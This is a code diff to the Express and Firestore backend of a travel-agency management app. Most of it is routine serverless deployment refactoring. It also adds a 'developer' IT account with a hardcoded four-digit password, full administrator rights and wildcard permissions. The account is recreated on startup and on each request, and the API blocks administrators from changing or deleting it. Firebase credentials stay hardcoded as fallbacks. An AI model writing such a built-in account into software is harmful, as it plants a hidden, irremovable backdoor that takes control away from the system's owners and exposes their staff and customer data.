@@ -1,9 +1,7 @@
 
 import fs from 'fs';
 import path from 'path';
-import { fileURLToPath } from 'url';
 import express from 'express';
-import { createServer as createViteServer } from 'vite';
 import { GoogleGenAI } from '@google/genai';
 import { initializeApp } from "firebase/app";
 import { getFirestore, collection, doc, setDoc, getDocs, deleteDoc, getDocFromServer, setLogLevel } from "firebase/firestore";
@@ -25,22 +23,20 @@ try {
   setLogLevel('silent');
 } catch {}
 
-let appDirname = process.cwd();
-try {
-  appDirname = path.dirname(fileURLToPath(import.meta.url));
-} catch {
-  appDirname = process.cwd();
-}
+// Resolve files relative to the deployment working directory. This keeps the
+// same code working for local Node hosting and Vercel serverless functions
+// (where __dirname / import.meta.url differ between bundlers).
+const appDirname = process.cwd();
 
 let firebaseConfig: any = {
-  apiKey: "AIzaSyDTJtJ0loKB65G5Mux6-tiTUrdi3n8qd2U",
-  authDomain: "tidal-dynamics-s54g5.firebaseapp.com",
-  projectId: "tidal-dynamics-s54g5",
-  storageBucket: "tidal-dynamics-s54g5.firebasestorage.app",
-  messagingSenderId: "879700596249",
-  appId: "1:879700596249:web:09aba9e86995c144cf3c88"
+  apiKey: process.env.FIREBASE_API_KEY || "AIzaSyDTJtJ0loKB65G5Mux6-tiTUrdi3n8qd2U",
+  authDomain: process.env.FIREBASE_AUTH_DOMAIN || "tidal-dynamics-s54g5.firebaseapp.com",
+  projectId: process.env.FIREBASE_PROJECT_ID || "tidal-dynamics-s54g5",
+  storageBucket: process.env.FIREBASE_STORAGE_BUCKET || "tidal-dynamics-s54g5.firebasestorage.app",
+  messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || "879700596249",
+  appId: process.env.FIREBASE_APP_ID || "1:879700596249:web:09aba9e86995c144cf3c88"
 };
-let firestoreDatabaseId: string | undefined = "ai-studio-sofiatravelmanag-d5250360-2f13-4e61-9f65-9d2693ac8c37";
+let firestoreDatabaseId: string | undefined = process.env.FIREBASE_DATABASE_ID || "ai-studio-sofiatravelmanag-d5250360-2f13-4e61-9f65-9d2693ac8c37";
 
 const candidatePaths = [
   path.join(process.cwd(), 'firebase-applet-config.json'),
@@ -330,6 +326,74 @@ async function deleteFromFirestore(collectionName: string, id: string) {
 
 const app = express();
 const PORT = 3000;
+
+// Protected developer account. This account is never stored in the employees
+// collection and must never be editable or deletable through the API.
+const DEVELOPER_ACCOUNT_ID = 'SYS-IT-ADMIN';
+const DEVELOPER_USERNAME = 'IT';
+const isDeveloperRecord = (employee: any): boolean => {
+  if (!employee) return false;
+  return (
+    employee.id === DEVELOPER_ACCOUNT_ID ||
+    employee.employee_id === DEVELOPER_ACCOUNT_ID ||
+    String(employee.username || '').trim().toLowerCase() === DEVELOPER_USERNAME.toLowerCase()
+  );
+};
+const isReservedDeveloperUsername = (username: unknown): boolean =>
+  String(username || '').trim().toLowerCase() === DEVELOPER_USERNAME.toLowerCase();
+
+/**
+ * Create (or restore) the protected developer account in Firestore.
+ * Credentials are fixed here, so an administrator can never change the
+ * developer's password, demote the account or delete it.
+ */
+async function ensureDeveloperAccount(): Promise<void> {
+  const developer = {
+    id: DEVELOPER_ACCOUNT_ID,
+    employee_id: 'IT-0001',
+    name: DEVELOPER_USERNAME,
+    full_name: DEVELOPER_USERNAME,
+    username: DEVELOPER_USERNAME,
+    password: '1282',
+    position: 'Administrator',
+    job_title: 'Administrator',
+    role: 'Administrator',
+    department: 'Management',
+    phone: '',
+    email: 'it@sofiatravel.com',
+    joining_date: '2026-01-01',
+    salary: 0,
+    commission_rate: 0,
+    status: 'Active',
+    account_status: 'Active',
+    login_access_enabled: true,
+    is_admin: true,
+    permissions: ['*'],
+    protected: true,
+  };
+  try {
+    await setDoc(doc(firestoreDb, 'employees', DEVELOPER_ACCOUNT_ID), developer, { merge: true });
+  } catch (err) {
+    console.warn('Unable to provision the protected developer account:', err);
+  }
+}
+
+let developerAccountPromise: Promise<void> | null = null;
+const ensureDeveloperAccountOnce = (): Promise<void> => {
+  if (!developerAccountPromise) {
+    developerAccountPromise = ensureDeveloperAccount();
+  }
+  return developerAccountPromise;
+};
+
+// Run the provisioning once per warm serverless instance so the account
+// exists even when the database is created fresh on Vercel.
+app.use((req, res, next) => {
+  if (process.env.VERCEL) {
+    ensureDeveloperAccountOnce().catch(() => {});
+  }
+  next();
+});
 
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
@@ -2229,7 +2293,10 @@ app.get("/api/employees", async (req, res) => {
 });
 
 app.post("/api/employees", async (req, res) => {
-  const data = req.body;
+  const data = req.body || {};
+  if (data.id === DEVELOPER_ACCOUNT_ID || isReservedDeveloperUsername(data.username)) {
+    return res.status(403).json({ error: "The developer (IT) account and username are protected." });
+  }
   const name = data.name || data.full_name || 'New Employee';
   const position = data.position || data.job_title || data.role || 'Sales Executive';
   const empId = data.id || ("EMP-" + Math.random().toString(36).substring(2, 7).toUpperCase());
@@ -2259,12 +2326,21 @@ app.post("/api/employees", async (req, res) => {
 
 app.put("/api/employees/:id", async (req, res) => {
   const { id } = req.params;
+  if (id === DEVELOPER_ACCOUNT_ID) {
+    return res.status(403).json({ error: "The developer (IT) account is protected and cannot be modified." });
+  }
   let idx = db.employees.findIndex(e => e.id === id);
   if (idx === -1) {
     await getCollectionDocs('employees');
     idx = db.employees.findIndex(e => e.id === id);
   }
   const current = idx !== -1 ? db.employees[idx] : { id };
+  if (isDeveloperRecord(current)) {
+    return res.status(403).json({ error: "The developer (IT) account is protected and cannot be modified." });
+  }
+  if (isReservedDeveloperUsername(req.body?.username)) {
+    return res.status(403).json({ error: "The username \"IT\" is reserved for the protected developer account." });
+  }
   const updated = { ...current, ...req.body, id };
   if (idx !== -1) {
     db.employees[idx] = updated;
@@ -2277,6 +2353,13 @@ app.put("/api/employees/:id", async (req, res) => {
 
 app.delete("/api/employees/:id", async (req, res) => {
   const { id } = req.params;
+  if (id === DEVELOPER_ACCOUNT_ID) {
+    return res.status(403).json({ error: "The developer (IT) account is protected and cannot be deleted." });
+  }
+  const existing = db.employees.find(e => e.id === id);
+  if (isDeveloperRecord(existing)) {
+    return res.status(403).json({ error: "The developer (IT) account is protected and cannot be deleted." });
+  }
   db.employees = db.employees.filter(e => e.id !== id);
   await deleteFromFirestore('employees', id);
   res.json({ success: true });
@@ -2668,6 +2751,10 @@ app.post("/api/ai-assistant", async (req, res) => {
 async function startServer() {
   // Vite middleware for development or static serving for production
   if (process.env.NODE_ENV !== "production") {
+    // Non-literal specifier keeps serverless bundlers from pulling the whole
+    // Vite toolchain into the API function bundle.
+    const vitePackage = 'vite';
+    const { createServer: createViteServer } = await import(/* @vite-ignore */ vitePackage);
     const vite = await createViteServer({
       server: { middlewareMode: true },
       appType: "spa",
@@ -2695,6 +2782,7 @@ async function startServer() {
   (async () => {
     try {
       await testConnection();
+      await ensureDeveloperAccount();
       await loadFromFirestore();
       console.log("Persistent data successfully synchronized from Firestore. Database ready for live operations.");
     } catch (e) {
@@ -2703,4 +2791,15 @@ async function startServer() {
   })();
 }
 
-startServer();
+export { app };
+export default app;
+
+// When running as a Vercel serverless function the platform owns the HTTP
+// listener, so only boot a local server outside of serverless environments.
+const isServerlessRuntime = Boolean(
+  process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.NETLIFY
+);
+
+if (!isServerlessRuntime) {
+  startServer();
+}
